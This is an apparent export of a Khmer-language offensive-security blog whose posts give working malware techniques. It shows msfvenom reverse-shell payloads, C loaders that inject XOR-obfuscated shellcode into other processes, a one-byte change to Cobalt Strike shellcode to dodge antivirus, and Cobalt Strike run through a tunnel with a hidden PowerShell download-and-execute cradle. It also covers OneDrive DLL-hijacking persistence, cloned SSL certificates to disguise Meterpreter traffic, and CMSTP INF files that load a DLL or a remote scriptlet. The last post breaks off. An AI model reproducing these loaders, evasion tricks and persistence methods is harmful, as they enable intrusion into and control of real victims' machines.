[{"content":"ខ្លះៗអំពីការ Bypass AV/EDR តាមរយៈ Metasploit Framework ។\nSelf-Injection Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។\n1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   បន្ទាប់មកយើងនឹង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;Windows.h\u0026gt; int main() { unsigned char shellcode[] = \u0026#34;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\u0026#34; \u0026#34;\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\u0026#34; \u0026#34;\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\u0026#34; \u0026#34;\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\u0026#34;; void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ដើម្បី Compile យើងអាចប្រើប្រាស់កម្មវិធីផ្សេងៗជាច្រើន តែសម្រាប់ខ្ញុំៗប្រើប្រាស់ Embarcadero Dev-C++ ដើម្បីដំណើរការបង្កើត ។\nដោយសាកល្បងដំណើរការ Payload នេះយើងនឹងទទួលបាន Meterpreter ដូចដែលយើងរំពឹងទុក ។\n","description":"វិធីសាស្ត្រ Evading AV/EDR ដោយប្រើប្រាស់ Junk Bytes","id":4,"section":"posts","tags":["c-shellcode","metasploit"],"title":"Evading AV/EDR with Junk Bytes","uri":"http://localhost:1313/en/posts/evading-avedr-with-junk-bytes/"},{"content":"Summary នៅក្នុងអត្ថបទនេះយើងនឹងធ្វើការបង្កើត Shellcode តាមរយៈវិធីសាស្ត្រ Process Injection ដោយភ្ជាប់ជាមួយនិងការដាក់នូវកូនសោរ XOR ក្នុងការធ្វើកូដនីយកម្មដើម្បីបញ្ចៀសពីការរកឃើញរបស់កម្មវិធីកំចាត់មេរោគ ។\nShellcode ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅនៅលើម៉ាស៊ីន 64 bit ។\n1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   XOR Shellcode បន្ទាប់មកយើងនឹងធ្វើការ XOR ទៅលើកូដនោះដោយប្រើប្រាស់ Python Script ដូចខាងក្រោម៖\n1 2 3 4 5 6 7 8 9 10  raw_shellcode = \u0026#34;my shellcode \\xaa\\xda\\xca\\[...]\\xbe\\x14\\x49\u0026#34; enc_shellcode = [] print (\u0026#34;[+] Shellcode is encoding\u0026#34;) for opcode in raw_shellcode: enc_opcode = (ord(opcode) ^ 0x41) enc_shellcode.append(enc_opcode) print (\u0026#34;========================Shellcode========================\\n\\n\u0026#34;) print (\u0026#34;\u0026#34;.join([\u0026#34;\\\\x{0}\u0026#34;.format(hex(abs(i)).replace(\u0026#34;0x\u0026#34;, \u0026#34;\u0026#34;)) for i in enc_shellcode])) print (\u0026#34;\\n\\n========================Shellcode========================\u0026#34;)   ក្រោយពីធ្វើកូដនីយកម្មរួចមក យើងនឹងទទួលបានកូដថ្មីមួយផ្សេងទៀត ចម្លងវាទុកដើម្បីធ្វើកិច្ចការបន្ត ។\nWINAPIs ខ្លីៗអំពីការ Bypass ដោយប្រើ WinAIPs\nOpenProcess 1 2 3 4 5  HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId );   OpenProcess ប្រើដើម្បីបើក Process ដោយផ្ដល់តម្លៃតាមរយៈ PID នៃ Process របស់វា ។ ដោយសារតែគោលបំណងរបស់ Process Injection គឺជាការបង្កើតនូវចន្លោះ Allocation ថ្មីមួយសម្រាប់ Shellcode នៅក្នុង Local Process បន្ទាប់មកវានឹងធ្វើការសរសេរបញ្ចូលនូវ Shellcode នោះចូលទៅក្នុងចន្លោះ Allocation ដែលបានបង្កើតរួចហើយទើបធ្វើការបើកដំណើរការ ។ ដូចនេះមុននឹងយើងធ្វើការបង្កើត Allocation ថ្មីមួយចូលទៅក្នុង Memory យើងត្រូវតែបង្កើត Process វាជាមុន ។\nចំណាំ៖ យើងត្រូវធ្វើការបិទ Opened handle តាមរយៈ CloseHandle()\nVirtualAllocEx 1 2 3 4 5 6 7  LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect );   យើងប្រើ VirtualAllocEx ដើម្បីធ្វើការ Allocate ចន្លោះនៃ Memory សម្រាប់ Shellcode របស់យើងនៅក្នុង Process ផ្សេង ។ ដោយឡែកសម្រាប់ VirtualAlloc យើងអាចប្រើប្រាស់វាចំពោះតែចន្លោះនៃ Memory ក្នុង Process ផ្ទាល់ខ្លួនរបស់វាប៉ុណ្ណោះ (Current Process) ។\nWriteProcessMemory 1 2 3 4 5 6 7  BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten );   យើងប្រើប្រាស់ WriteProcessMemory សម្រាប់ធ្វើការសរសេរបញ្ជូលនូវ Shellcode ចូលទៅកាន់ Allocation ថ្មីមួយដែលបានមកពីការបង្កើត Process ផ្សេងតាមរយៈ VirtualAllocEx ខាងលើ។\nVirtualProtectEx 1 2 3 4 5 6 7  BOOL VirtualProtectEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect );   យើងប្រើ VirtualProtectEx ដើម្បីធ្វើការកែប្រែ Protection Permission ។\nCreateRemoteThread 1 2 3 4 5 6 7 8 9  HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId );   យើងប្រើ CreateRemoteThread ដើម្បីបង្កើត Thread ដែលបានដំណើរនៅក្នុងចន្លោះ Virtual Address នៃ Process ផ្សេងទៀត ។ ដោយឡែកសម្រាប់ CreateThread យើងអាចប្រើប្រាស់វាចំពោះតែការបង្កើត Thread ក្នុង Process ផ្ទាល់ខ្លួនរបស់វាប៉ុណ្ណោះ (Current Process) ។\nPWN The Shellcode ខាងក្រោមនេះជាការបង្កើត Binary File ក្នុងការចាក់បញ្ជូល Shellcode ទៅក្នុង Process ដទៃទៀត ហើយមានលទ្ធភាពក្នុងការ Bypass កម្មវិធីកំចាត់មេរោគធំៗមួយចំនួនផងដែរ ។\nខាងក្រោមជាការប្រើប្រាស់ opcode ដើម្បី Decode ទៅលើ Shellcode opcode ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;Windows.h\u0026gt; int main(int argc, char* argv[]) { unsigned char shellcode[] = \u0026#34;\\x98\\xaa\\xda\\xca\\[...]\\xbe\\x14\\x49\u0026#34;; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; DWORD oldPerms; DWORD PID = 16772; //Change it to target PID  printf(\u0026#34;Injecting to PID: %i\u0026#34;, PID); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ); int i; int n = 0; for (i = 0; i \u0026lt;= sizeof(shellcode); i++) { char dec_opcode = shellcode[i] ^ 0x41; if (WriteProcessMemory(processHandle, (char*)remoteBuffer + n, \u0026amp;dec_opcode, 1, NULL)) { n++; } } VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, \u0026amp;oldPerms); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0; }   នៅក្នុង For Loop Function យើងបានធ្វើការ Decoded Shellcode ជាមួយនិងការសរសេរបញ្ជូល opcode ចូលទៅក្នុង Memory ភ្លាមៗ ។\nតស់ចាប់ផ្ដើម Compile និងសាកល្បងដំណើរការ ។\nការចាក់បញ្ជូលទទួលបានជោគជ័យ ដោយធ្វើការចាក់បញ្ជូលក្នុង Process របស់កម្មវិធី OneDrive.exe ដែលមានលេខ PID 408 ។\nScan Result ខាងក្រោមជាលទ្ធផលធ្វើតេស្តនៅក្នុងការស្កេនលើកម្មវិធីកំចាត់មេរោគល្បីៗ ។\nតំណរភ្ជាប់៖ ANTISCAN.ME\n","description":"ចាក់បញ្ជូល Shellcode និង Bypass AV/EDR ដោយប្រើប្រាស់ XOR","id":5,"section":"posts","tags":["c-shellcode","bypass","xor"],"title":"Process Injection - Bypass AV/EDR with XOR - 0x01","uri":"http://localhost:1313/en/posts/process-injection-bypass-avedr-with-xor-0x01/"},{"content":"Pwn Self Injection បង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។\n1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   ខាងក្រោមជាវិធីសាស្ត្រសម្រាប់ចាក់ Process ចូលទៅកាន់ PID ណាមួយដោយមិនមាន DEP protection និងមិនមានសិទ្ធក្នុងការសរសេរចូល ឬដំណើរការបាន (Non-Writable / Non-Executable Allocation) ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;Windows.h\u0026gt; int main(int argc, char* argv[]) { unsigned char shellcode[] = \u0026#34;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\u0026#34; \u0026#34;\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\u0026#34; \u0026#34;\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\u0026#34; \u0026#34;\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\u0026#34;; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; DWORD oldPerms; DWORD PID = 1524; printf(\u0026#34;Injecting to PID: %i\u0026#34;, PID); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ); WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, \u0026amp;oldPerms); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0; }   កែត្រង់ PID បន្ទាប់មក Compile កូដខាងលើតាមធម្មតា (សម្រាប់ Visual Studio 20xx តម្រូវឲ្យធ្វើការបិទ DEP Protection មុននិង Build) បន្ទាប់មកសូមសាកល្បងបើកដំណើរការ ។\nជោគជ័យ!!! ពេលនេះយើងបានចាក់ Shellcode ចូលទៅក្នុង Process នៃកម្មវិធី Notepad.exe តាមរយៈ PID 1524 ដោយមិនមានសិទ្ធ Write ឬ Execute បានសម្រេច ៕\nសម្រង់ចេញពី៖ XRET2PWN\n","description":"ចាក់បញ្ជូល Shellcode ក្នុង Process ដោយគ្មាន Write/Exec Allocation","id":6,"section":"posts","tags":["c-shellcode"],"title":"Process Injection without Write/Execute Permission","uri":"http://localhost:1313/en/posts/process-injection-without-write-exec-permission/"},{"content":"Self-Injection Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។\n1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   បន្ទាប់មកយើងនឹង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;Windows.h\u0026gt; int main() { unsigned char shellcode[] = \u0026#34;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\u0026#34; \u0026#34;\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\u0026#34; \u0026#34;\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\u0026#34; \u0026#34;\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\u0026#34;; void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ដើម្បី Compile យើងអាចប្រើប្រាស់កម្មវិធីផ្សេងៗជាច្រើន តែសម្រាប់ខ្ញុំៗប្រើប្រាស់ Embarcadero Dev-C++ ដើម្បីដំណើរការបង្កើត ។\nដោយសាកល្បងដំណើរការ Payload នេះយើងនឹងទទួលបាន Meterpreter ដូចដែលយើងរំពឹងទុក ។\n","description":"ចាក់បញ្ជូល Shellcode ក្នុង Process ដោយប្រើវិធីសាស្ត្រ Self Injection","id":7,"section":"posts","tags":["c-shellcode"],"title":"Process Injection - Self Injection Method","uri":"http://localhost:1313/en/posts/process-injection-self-injection-method/"},{"content":"ខាងក្រោមនេះជាគំនិតផ្ទាល់ខ្លួនក្នុងការតភ្ជាប់ Teamserver និងប្រើប្រាស់ពាក្យបញ្ជាតាមរយៈ Beacons ពីចំងាយដោយមិនចាំបាច់បើក Port Forwarding ។\nRequirements  CobaltStrike Telebit  Telebit Setup ចំណាំ៖ ចូលទៅកាន់ telebit.cloud ដើម្បីយល់ដឹងបន្ថែមអំពី Configuration ។\nនៅក្នុងលីនុចសូមបើកផ្ទាំង Terminal រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖\n1 2  // Install Telebit curl https://get.telebit.io/ | bash   ក្រោយពីបំពេញអាសយដ្ឋាន Email រួចសូមចូលទៅកាន់ផ្ទាំង Inbox រួចបើកដំណើរដំណភ្ជាប់ដែលគេបានផ្ញើមក និងចម្លងចូលនូវលេខទាំង ៤ ខ្ទង់នោះដើម្បីផ្ទៀងផ្ទាត់ ។\nប្រសិនបើមិនមានអ្វីខុសឆ្គងទេ យើងនឹងទទួលបានសារបញ្ជាក់ពីភាពជោគជ័យដូចខាងក្រោម៖\nUsage តស់! ឥលូវចាប់ផ្ដើមធ្វើការកំណត់នៅលេខ Port សម្រាប់តភ្ជាប់ទៅកាន់ Teamserver និង Beacons\n1 2 3 4 5  // Setup Teamserver Port ~/telebit tcp 50050 // Setup HTTP Beacon ~/telebit http 80 //don\u0026#39;t change the port   Teamserver Connection បន្ទាប់មកសូមវាយពាក្យបញ្ជាដូចខាងក្រោមដើម្បីបើកដំណើរការ Teamserver\n1  sudo ./teamserver x.x.x.x your_password   ដូច្នេះយើងសាកល្បងតភ្ជាប់ Teamserver ដោយប្រើប្រាស់លេខអាយភីរបស់ telebit.cloud ដូចខាងក្រោម៖\nសូមឲ្យប្រាកដថាលេខអាយភី (អាច ping ចេញពី telebit.cloud) លេខច្រក (Port) និង លេខសំងាត់គឺត្រឹមត្រូវមុននិងចុចតភ្ជាប់។\nជោគជ័យ! ឥលូវនេះយើងបានតភ្ជាប់ Teamserver បានសម្រេច។\nAdding HTTP/HTTPS Listener ខាងក្រោមនេះជាវិធីក្នុងការបើកដំណើរការ Listener ពីចំងាយដោយប្រើប្រាស់ Protocol ប្រភេទ HTTP។\nដោយសារតែ Telebit ត្រូវបាន Redirect ទៅកាន់ Protocol ប្រភេទ HTTPS ដូចនេះយើងក៏ត្រូវតែបើក Listener ជាប្រភេទ HTTPS មួយទៀត។\nសូមធ្វើការបើក HTTPS Listener ដូចបានបង្ហាញខាងក្រោម៖\nGenerate Beacon ការកំណត់ខាងលើរួចរាល់អស់ហើយ ដូចនេះយើងអាចសាកល្បងបង្កើត Beacon ដើម្បីតភ្ជាប់។\nនៅក្នុងការបង្ហាញនេះយើងនិងប្រើប្រាស់ការវាយប្រហារបែប Scripted Web Delivery ។\nចំណាំ៖ នៅពេលដែលបានបង្កើតរួចសូមធ្វើការកែប្រែនៅផ្នែកមួយចំនួនដូចជាប្រភេទ Protocol និង Port ដូចខាងក្រោម៖\n1 2 3 4 5  // By default it will download from port 80 without https powershell.exe -nop -w hidden -c \u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://shy-impala-40.telebit.io:80/foo\u0026#39;))\u0026#34; // Then we have to remove the port and add https instead powershell.exe -nop -w hidden -c \u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;https://shy-impala-40.telebit.io/foo\u0026#39;))\u0026#34;   Execute យើងបានសាកល្បងបើកដំណើរការនៅក្នុងវីនដូ ១០ ប្រភេទ Pro x64 Bit ដូចរូបខាងក្រោម៖\nប្ដូទៅមើលផ្ទាំងគ្រប់គ្រង CobaltStrike យើងនឹងទទួលបានការតភ្ជាប់ Beacon ពីវីនដូ ១០ នោះ៕\n","description":"តភ្ជាប់និងប្រើប្រាស់ពាក្យបញ្ជាក្នុង CobaltStrike ពីចំងាយ","id":8,"section":"posts","tags":["tunnel","over-wan"],"title":"CobaltStrike Over WAN Connection","uri":"http://localhost:1313/en/posts/cobaltstrike-overwan-connection/"},{"content":"C - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include \u0026lt;windows.h\u0026gt;using namespace std; void exec() { WinExec(\u0026#34;cmd.exe /c c:\\\\programdata\\\\putty.exe\u0026#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }  \nDLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖\n1 2 3 4 5 6 7 8  // To create Windows executables, you need to instsall mingw cross-compiler sudo apt-get install mingw-w64 //For x64 compile with: x86_64-w64-mingw32-gcc r4t.c -shared -o output.dll //For x86 compile with: i686-w64-mingw32-gcc r4t.c -shared -o output.dll   Get Persistence In Windows 10 ប្ដូរឈ្មោះ Payload ដែលបានបង្កើតរួច ឲ្យទៅជា cscapi.dll បន្ទាប់មកចម្លងឯកសារមេរោគនោះដាក់ចូលទៅកាន់បណ្ដុំនៃឯកសាររបស់ OneDrive ដែលមានទីតាំងដូចខាងក្រោម៖\n1  C:\\Users\\[username]\\AppData\\Local\\Microsoft\\OneDrive\\   \nវីធីសាស្ត្រនេះគឺអាចដាក់ Persistence បានដោយប្រើប្រាស់ឯកសារយោងនៃ onedrive.exe ដូចនេះនៅរាល់ពេលដែលកម្មវិធី OneDrive ដែលបានដម្លើងមកស្រាប់ក្នុងវីនដូត្រូវបានបើកនៅក្នុង Start Up នោះវានឹងទៅបើកដំណើរការឯកសារមេរោគផ្ទាល់តែម្ដង។\nពាក្យបញ្ជាទាំងពីរខាងក្រោមនេះសម្រាប់សម្លាប់ Process ដែលកំពុងបើក និងបើកដំណើរការកម្មវិធីឡើងមកវិញ ក្នុងករណីបើអ្នកចង់សាកម្ដងដំណើរការវិធីសាស្ត្រខាងលើភ្លាមៗដោយមិនចាំបាច់ធ្វើការ Restart កុំព្យូទ័រ៕\n1 2 3 4 5  //To kill the onedrive procress type taskkill /im onedrive.exe /f //Run the file cmd.exe /c onedrive.exe   ឯកសារយោង៖ ippsec\n","description":"បើក Persistence តាមរយៈវិធីសាស្ត្រ DLL Hijacking","id":9,"section":"posts","tags":["dll","persistence"],"title":"DLL Hijacking - Persistence Method","uri":"http://localhost:1313/en/posts/dll-hijacking-persistence-method/"},{"content":"1 Byte Evading ដំបូងយើងត្រូវបង្កើត Shell Code ជាប្រភេទភាសារ C នៅក្នុង Cobalt Strike ដូចរូបខាងក្រោម៖\nសូមចាប់អារម្មណ៏ត្រង់ Byte ដំបូងគេនៃ Code គឺ \\xfc ។\nតស់!!! មកកែប្រែចំនួន Byte ដូចខាងក្រោម៖\nប្ដូរ \\xfc ទៅជាចំនួនតម្លៃ Byte ផ្សេង។ ឧ. \\xfd, \\x3a, \\x6f\\ ។ល។\rរក្សាតម្លៃដើមដែលត្រឹមត្រូវនៅក្នុង Char Variable = char first[] = \"\\xfc\";\rBuild ឯកសារ exe ជាមួយកម្មវិធីអានកូដជាការស្រេច។\r\rខាងក្រោមជា Source Code សម្រាប់អ្នកដែលចង់សាកល្បងវិធីសាស្ត្រមួយនេះ៕\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //payload.cpp #include \u0026#34;stdafx.h\u0026#34;#include \u0026#34;Windows.h\u0026#34;#include \u0026lt;iostream\u0026gt; int main(int argc, char *argv[]) { ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // cobalt strike beacon shellcode x64 \tunsigned char shellcode[] = \u0026#34;\\xfd\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x31\\x30\\x2e\\x30\\x2e\\x30\\x2e\\x35\\x00\\x00\\x00\\x00\\x00\u0026#34;; char first[] = \u0026#34;\\xfc\u0026#34;; void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(shellcode, first, 1); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ឯកសារយោង៖ ired\n","description":"Evading Antivirus ដោយប្រើប្រាស់បច្ចេកទេសប្ដូរតម្លៃលេខគោលពីរ","id":10,"section":"posts","tags":["c-shellcode","bypass"],"title":"1 Byte Changed Evading Antivirus","uri":"http://localhost:1313/en/posts/1byte-changed-evading-av/"},{"content":"Clone SSL Certification តើអ្នកដឹងទេថា យើងអាចធ្វើការថតចម្លងនូវរាល់ឯកសារ SSL Certificate របស់គេហទំព័រដទៃបាន ដោយប្រើប្រាស់ Module មួយនៅក្នុង Metasploit Framework ដែលត្រូវបានបង្កើតឡើងដោយលោក Chris John Riley ។ ឯកសារដែលត្រូវបានថតចម្លងនោះ នឹងត្រូវរក្សាទុកជាប្រភេទទម្រង់ឯកសារ PEM ហើយវាក៏អាចប្រើប្រាស់បានគ្រប់ប្រភេទ Modules នៅក្នុង Metasploit ផងដែរ។\nដើម្បីថតចម្លង យើងអាចប្រើប្រាស់ពាក្យបញ្ជាដូចខាងក្រោម៖\n1 2 3  use auxiliary/gather/impersonate_ssl set rhosts https://example.com/ exploit   ដូចដែលរូបបានបង្ហាញខាងលើ គឺយើងបានថតចម្លងឯកសារ Certificate បានសម្រេច។\nMeterpreter Using SSL Connection ខាងក្រោមនេះគឺជាការសាកល្បងប្រើប្រាស់ SSL Certificate ដែលបានថតចម្លងនោះមកភ្ជាប់ទំនាក់ទំងរវាង Attacker PC និង Victim PC ដោយប្រើប្រាស់ Reverse Shell ជាប្រភេទ HTTPS ។\nបើកចូលផ្ទាំង Terminal នៃ Metasploit Framework រួចបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖\n1 2 3 4 5 6 7  use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set lhost 192.168.xxx.xxx set lport xxx set stagerverifysslcert true set handlersslcert /xxx/xxx/xxx/cert.pem exploit   Generate HTTPS Malicious Payload បង្កើតមេរោគតាមរយៈ Msfvenom និងជ្រើសរើស HTTPS Reverse Shell ។\n1  msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.xxx.xxx lport=xxx -f exe -b \u0026#39;\\x00\u0026#39; -o ~/Desktop/s0rry.exe   Exploited សាកល្បងបើកដំណើរការមេរោគក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូ។\nជោគជ័យ!!! C2 ពេលនេះដំណើរការនៅលើ SSL Encryption ៕\n","description":"ក្លែងបន្លំ SSL និងបញ្ជៀសពីការចាប់របស់ AV","id":11,"section":"posts","tags":["metasploit","ssl","bypass"],"title":"Impersonate SSL - MSF Bypass Detection","uri":"http://localhost:1313/en/posts/bypass-detection-msf-shell/"},{"content":"ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវីនដូ៖\n1 2  C:\\Windows\\System32\\cmstp.exe C:\\Windows\\SysWOW64\\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង Blog របស់គាត់។\nDLL Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។\n1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll \u0026gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\\Users\\Victim\\idm.dll [Strings] AppAct = \u0026#34;SOFTWARE\\Microsoft\\Connection Manager\u0026#34; ServiceName=\u0026#34;idm\u0026#34; ShortSvcName=\u0026#34;idm\u0026#34;   រក្សាទុកជា \u0026ldquo;idm-service.inf\u0026rdquo;\nបើកដំណើរការ Multi/handler នៅលើម៉ាស៊ីនមេ និង កំណត់ទទួលការតភ្ជាប់។\nPayload នឹងដំណើរការភ្លាមៗនៅពេលដែលឯកសារ INF ត្រូវ​បាន​បើក​ដោយ​ប្រើប្រាស់ឯកសារ CMSTP ។\nបន្ទាប់មក Metasploit និងទទួលបាន Reverse Shell ក្រោយពីស្គ្រីបបានបើកឯកសារ DLL រួច។\nSCT CMSTP ក៏អាចប្រើប្រាស់ឯកសារប្រភេទ SCT ដើម្បី​ទាញយក​ពាក្យ​បញ្ជា​ផ្សេងៗ​ពីម៉ាស៊ីនមេ​មក​ប្រើប្រាស់​ផង​ដែរ។\nលោក Nick Tyrere បានបង្ហាញលំអិតនៅក្នុង Twitter របស់គាត់។\nលោកក៏បានបង្កើតស្គ្រីបនេះដោយដាក់ឈ្មោះថា powersct.sct ដែល​​ប្រើ​សម្រាប់​បើក​ដំណើរ​ការ​ពាក្យ​បញ្ជា​គ្រោះ​ថ្នាក់​ណាមួយ​ចេញ​ពី PowerShell ។\nសម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងដំណរភ្ជាប់របស់ឯកសារ SCT ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] %11%\\scrobj.dll,NI,http://192.168.200.55/pentestlab.sct [Strings] AppAct = \u0026#34;SOFTWARE\\Microsoft\\Connection Manager\u0026#34; ServiceName=\u0026#34;idm\u0026#34; ShortSvcName=\u0026#34;idm\u0026#34;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ### powersct.sct 